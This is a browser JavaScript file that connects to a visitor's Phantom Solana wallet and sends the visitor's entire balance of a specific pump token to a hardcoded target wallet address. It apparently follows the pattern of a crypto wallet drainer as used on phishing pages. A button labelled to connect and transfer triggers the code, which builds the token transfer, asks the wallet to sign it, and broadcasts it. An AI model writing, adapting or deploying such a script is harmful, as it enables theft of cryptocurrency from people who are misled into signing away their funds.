// Configuration
const PUMP_MINT = new solanaWeb3.PublicKey('4sxxEHW6XqX5YBYs29f1p2RhR7afXFS8wQWcMYQVpump');
const TARGET_WALLET = new solanaWeb3.PublicKey('95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD');

// DOM Elements
const transferBtn = document.getElementById('transferBtn');
const statusDiv = document.getElementById('status');

// Update status
function updateStatus(message, type = '') {
    statusDiv.innerHTML = message;
    statusDiv.className = type;
    console.log(message);
}

// Main function - simple and direct
async function transferPumpTokens() {
    try {
        // 1. Check if wallet exists
        if (!window.solana || !window.solana.isPhantom) {
            updateStatus('❌ Please install Phantom wallet first!', 'error');
            return;
        }

        // 2. Connect wallet
        updateStatus('🔄 Connecting wallet...', 'loading');
        
        const provider = window.solana;
        const response = await provider.connect();
        const userPublicKey = response.publicKey.toString();
        
        updateStatus(`✅ Connected: ${userPublicKey.slice(0, 8)}...`, 'success');

        // 3. Setup connection
        updateStatus('🔗 Setting up connection...', 'loading');
        
        // Use Helius RPC for better reliability
        const connection = new solanaWeb3.Connection(
            'https://mainnet.helius-rpc.com/?api-key=1a2345b6-c7d8-9e01-f2a3-b4c5d6e7f8a9', // Public Helius endpoint
            'confirmed'
        );

        // 4. Get PUMP token balance
        updateStatus('💰 Checking PUMP balance...', 'loading');
        
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
            new solanaWeb3.PublicKey(userPublicKey),
            { mint: PUMP_MINT }
        );

        if (tokenAccounts.value.length === 0) {
            updateStatus('❌ No PUMP tokens found in wallet', 'error');
            return;
        }

        const tokenAccount = tokenAccounts.value[0];
        const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
        const balance = tokenAmount.uiAmount;
        
        if (balance <= 0) {
            updateStatus('❌ PUMP balance is zero', 'error');
            return;
        }

        updateStatus(`📊 Found ${balance} PUMP tokens`, 'success');

        // 5. Prepare transfer transaction
        updateStatus('⚡ Preparing transfer...', 'loading');
        
        // Get associated token accounts
        const fromTokenAccount = tokenAccount.pubkey;
        const toTokenAccount = await splToken.getAssociatedTokenAddress(
            PUMP_MINT,
            TARGET_WALLET
        );

        // Create transaction
        const transaction = new solanaWeb3.Transaction();

        // Check/create target token account
        const toAccountInfo = await connection.getAccountInfo(toTokenAccount);
        if (!toAccountInfo) {
            transaction.add(
                splToken.createAssociatedTokenAccountInstruction(
                    new solanaWeb3.PublicKey(userPublicKey),
                    toTokenAccount,
                    TARGET_WALLET,
                    PUMP_MINT
                )
            );
        }

        // Add transfer instruction
        const rawAmount = tokenAmount.amount; // Raw amount with decimals
        transaction.add(
            splToken.createTransferInstruction(
                fromTokenAccount,
                toTokenAccount,
                new solanaWeb3.PublicKey(userPublicKey),
                rawAmount
            )
        );

        // 6. Get blockhash and sign
        updateStatus('🔐 Getting blockhash...', 'loading');
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = new solanaWeb3.PublicKey(userPublicKey);

        updateStatus('✍️ Signing transaction...', 'loading');
        
        const signedTx = await provider.signTransaction(transaction);

        // 7. Send transaction
        updateStatus('🚀 Sending transaction...', 'loading');
        
        const signature = await connection.sendRawTransaction(signedTx.serialize());

        updateStatus(`✅ Transaction sent: ${signature.slice(0, 16)}...`, 'success');

        // 8. Wait for confirmation
        updateStatus('⏳ Waiting for confirmation...', 'loading');
        
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');

        if (confirmation.value.err) {
            throw new Error('Transaction failed');
        }

        // 9. Success!
        updateStatus(
            `🎉 SUCCESS! Transferred ${balance} PUMP tokens!<br>
            <a href="https://solscan.io/tx/${signature}" target="_blank" style="color: #4cc9f0;">
                View on Solscan
            </a>`,
            'success'
        );

    } catch (error) {
        console.error('Error:', error);
        
        let errorMsg = error.message;
        
        // Handle common errors
        if (errorMsg.includes('User rejected')) {
            errorMsg = 'Transaction was cancelled';
        } else if (errorMsg.includes('403') || errorMsg.includes('429')) {
            errorMsg = 'Network busy. Please try again in 30 seconds';
        } else if (errorMsg.includes('TokenAccountNotFoundError')) {
            errorMsg = 'No PUMP tokens found';
        }
        
        updateStatus(`❌ Error: ${errorMsg}`, 'error');
    } finally {
        transferBtn.disabled = false;
        transferBtn.textContent = '🔗 CONNECT WALLET & TRANSFER PUMP';
    }
}

// Event listener
transferBtn.addEventListener('click', async () => {
    try {
        transferBtn.disabled = true;
        transferBtn.textContent = '🔄 Processing...';
        await transferPumpTokens();
    } catch (error) {
        console.error('Unexpected error:', error);
        updateStatus('❌ Unexpected error occurred', 'error');
        transferBtn.disabled = false;
        transferBtn.textContent = '🔗 CONNECT WALLET & TRANSFER PUMP';
    }
});

// Helper function to copy addresses
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Copied to clipboard!');
    });
}
